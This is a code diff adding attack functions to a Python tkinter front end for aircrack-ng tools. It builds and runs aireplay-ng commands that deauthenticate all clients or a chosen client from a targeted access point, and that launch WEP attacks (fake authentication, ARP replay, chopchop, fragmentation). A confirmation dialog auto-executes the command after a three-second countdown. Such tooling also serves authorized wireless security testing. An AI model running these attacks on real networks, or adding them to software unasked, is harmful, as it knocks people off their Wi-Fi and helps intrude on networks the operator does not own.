@@ -323,6 +323,84 @@ class SignalGraph:
         self.canvas.create_line(flat, fill=THEME["accent"], width=2)
 
 
+class CountdownDialog(tk.Toplevel):
+    """Modal dialog showing the exact attack command with a 3-second countdown."""
+
+    def __init__(self, parent, command: list[str]):
+        super().__init__(parent)
+        self.title("Confirm Attack")
+        self.configure(bg=THEME["bg"])
+        self.resizable(False, False)
+        tk.Label(self, text="Command to execute:", bg=THEME["bg"], fg=THEME["fg"]).pack(padx=10, pady=5)
+        cmd_text = tk.Entry(self, width=80)
+        cmd_text.insert(0, " ".join(command))
+        cmd_text.config(state="readonly", bg=THEME["panel"], fg=THEME["fg"])
+        cmd_text.pack(padx=10, pady=5)
+        self.label = tk.Label(self, text="Executing in 3...", bg=THEME["bg"], fg=THEME["fg"], font=("TkDefaultFont", 12, "bold"))
+        self.label.pack(padx=10, pady=10)
+        btn_frame = tk.Frame(self, bg=THEME["bg"])
+        btn_frame.pack(pady=5)
+        tk.Button(btn_frame, text="Cancel", command=self._cancel, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="Execute Now", command=self._execute, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
+        self.result = False
+        self.count = 3
+        self._tick()
+        self.transient(parent)
+        self.grab_set()
+
+    def _tick(self):
+        if self.result or not self.winfo_exists():
+            return
+        if self.count <= 0:
+            self._execute()
+            return
+        self.label.config(text=f"Executing in {self.count}...")
+        self.count -= 1
+        self.after(1000, self._tick)
+
+    def _execute(self):
+        self.result = True
+        self.destroy()
+
+    def _cancel(self):
+        self.result = False
+        self.destroy()
+
+
+class AttackController:
+    """Build and run aireplay-ng commands, streaming output to a log callback."""
+
+    def __init__(self, log_func):
+        self.log = log_func
+        self._current = None
+
+    def _run(self, cmd: list[str]):
+        self.log(f"$ {' '.join(cmd)}")
+        self._current = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
+        for line in self._current.stdout:
+            self.log(line.rstrip())
+        self._current.wait()
+        self._current = None
+
+    def deauth_all(self, bssid: str, mon_iface: str, count: int = 10):
+        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, mon_iface]
+        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()
+
+    def deauth_client(self, bssid: str, client: str, mon_iface: str, count: int = 10):
+        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client, mon_iface]
+        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()
+
+    def legacy_attack(self, kind: str, bssid: str, our_mac: str, mon_iface: str):
+        flag = {"fakeauth": "-1", "arpreplay": "-3", "chopchop": "-4", "fragmentation": "-5"}[kind]
+        if kind == "fakeauth":
+            cmd = ["aireplay-ng", flag, "0", "-a", bssid, "-h", our_mac, mon_iface]
+        else:
+            cmd = ["aireplay-ng", flag, "-b", bssid, "-h", our_mac, mon_iface]
+        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()
+
+
 class N2NgApp:
     """Main tkinter application."""
 
@@ -337,7 +415,7 @@ class N2NgApp:
         self.airmon = AirmonManager()
         self.worker = AirodumpWorker(self.queue)
         self.capture_manager = None  # set in Task 8
-        self.attack = None  # set in Task 7
+        self.attack = AttackController(self._log)
 
         self.networks: dict[str, dict] = {}
         self.clients: list[dict] = []
@@ -446,10 +524,23 @@ class N2NgApp:
         # Signal graph
         self.signal_graph = SignalGraph(parent)
 
-        # Attack panel placeholder (filled in Task 7)
+        # Attack panel
         self.attack_frame = tk.LabelFrame(parent, text="Attacks", bg=THEME["panel"], fg=THEME["fg"])
         self.attack_frame.pack(fill=tk.X, padx=5, pady=5)
-        tk.Label(self.attack_frame, text="Attack controls will appear here", bg=THEME["panel"], fg=THEME["fg"]).pack(pady=20)
+        tk.Button(self.attack_frame, text="Deauthenticate All Clients", command=self._deauth_all, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)
+        tk.Button(self.attack_frame, text="Deauthenticate Specific Client", command=self._deauth_client, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)
+
+        self.legacy_visible = tk.BooleanVar(value=False)
+        tk.Checkbutton(self.attack_frame, text="Show Legacy WEP Attacks", variable=self.legacy_visible, command=self._toggle_legacy, bg=THEME["panel"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(anchor=tk.W, padx=5)
+        self.legacy_frame = tk.LabelFrame(self.attack_frame, text="Legacy WEP Attacks", bg=THEME["panel"], fg=THEME["fg"])
+        for label, kind in (("Fake Authentication", "fakeauth"), ("ARP Replay", "arpreplay"), ("Chopchop", "chopchop"), ("Fragmentation", "fragmentation")):
+            tk.Button(self.legacy_frame, text=label, command=lambda k=kind: self._legacy_attack(k), bg=THEME["panel"], fg=THEME["fg"]).pack(fill=tk.X, padx=5, pady=2)
+
+    def _toggle_legacy(self):
+        if self.legacy_visible.get():
+            self.legacy_frame.pack(fill=tk.X, padx=5, pady=5)
+        else:
+            self.legacy_frame.pack_forget()
 
     def _build_status_bar(self):
         self.status = tk.Label(self.root, text="Ready", bg=THEME["panel"], fg=THEME["fg"], anchor=tk.W)
@@ -566,6 +657,64 @@ class N2NgApp:
             self.size_label.config(text=f"Capture: {human_size(size)}")
         if self.locked_target:
             self.root.after(1000, self._start_capture_size_monitor)
+
+    # ------------------------------------------------------------------
+    # Attack handlers
+    # ------------------------------------------------------------------
+    def _our_mac(self) -> str | None:
+        try:
+            out = subprocess.check_output(["ip", "link", "show", self.mon_iface], text=True, stderr=subprocess.DEVNULL)
+            m = re.search(r"link/ether\\s+([0-9a-f:]{17})", out)
+            if m:
+                return m.group(1).upper()
+        except Exception:
+            pass
+        return None
+
+    def _confirm_attack(self, cmd: list[str]) -> bool:
+        dlg = CountdownDialog(self.root, cmd)
+        self.root.wait_window(dlg)
+        return dlg.result
+
+    def _deauth_all(self):
+        if not self.locked_target or not self.mon_iface:
+            messagebox.showwarning("N2-ng", "Lock a target first.")
+            return
+        bssid = self.locked_target["bssid"]
+        cmd = ["aireplay-ng", "-0", "10", "-a", bssid, self.mon_iface]
+        if self._confirm_attack(cmd):
+            self.attack.deauth_all(bssid, self.mon_iface, count=10)
+
+    def _deauth_client(self):
+        if not self.locked_target or not self.mon_iface:
+            messagebox.showwarning("N2-ng", "Lock a target first.")
+            return
+        item = self.client_tree.selection()
+        if not item:
+            messagebox.showwarning("N2-ng", "Select a client from the table.")
+            return
+        client = self.client_tree.item(item[0], "values")[0]
+        bssid = self.locked_target["bssid"]
+        cmd = ["aireplay-ng", "-0", "10", "-a", bssid, "-c", client, self.mon_iface]
+        if self._confirm_attack(cmd):
+            self.attack.deauth_client(bssid, client, self.mon_iface, count=10)
+
+    def _legacy_attack(self, kind: str):
+        if not self.locked_target or not self.mon_iface:
+            messagebox.showwarning("N2-ng", "Lock a target first.")
+            return
+        our_mac = self._our_mac()
+        if not our_mac:
+            messagebox.showwarning("N2-ng", "Could not determine our MAC address.")
+            return
+        bssid = self.locked_target["bssid"]
+        flag = {"fakeauth": "-1", "arpreplay": "-3", "chopchop": "-4", "fragmentation": "-5"}[kind]
+        if kind == "fakeauth":
+            cmd = ["aireplay-ng", flag, "0", "-a", bssid, "-h", our_mac, self.mon_iface]
+        else:
+            cmd = ["aireplay-ng", flag, "-b", bssid, "-h", our_mac, self.mon_iface]
+        if self._confirm_attack(cmd):
+            self.attack.legacy_attack(kind, bssid, our_mac, self.mon_iface)
 
     # ------------------------------------------------------------------
     # Queue / network updates
